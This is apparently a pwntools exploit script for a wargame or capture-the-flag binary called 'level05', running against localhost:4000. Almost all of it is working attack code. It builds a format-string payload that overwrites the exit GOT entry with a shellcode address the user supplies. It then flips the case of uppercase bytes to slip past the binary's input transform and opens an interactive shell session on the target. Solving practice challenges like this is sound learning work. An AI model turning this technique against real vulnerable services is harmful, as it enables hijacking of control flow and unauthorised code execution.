#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 4000 ./level05
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./level05')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'localhost'
port = int(args.PORT or 4000)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x8048000)
# RWX:      Has RWX segments

def xor_payload(payload):
    new_payload = bytearray()
    for b in payload:
        if b > 64 and b <= 90:
            new_payload.append(b ^ 0x20)
        else:
            new_payload.append(b)
    return new_payload
            

exit_got_plt = 0x080497E0
payload = fmtstr_payload(10, {exit_got_plt: int(input("shellcode addr > "), 16)}, write_size="byte")
new_payload = xor_payload(payload)

print(f"{new_payload=}")
if args.PAYLOAD:
    print("(echo -e " + repr(bytes(new_payload))[1:] + "; cat) | ./level05")
    exit(1)

p = start()
pause()
p.sendline(bytes(new_payload))
p.interactive()
p.close()
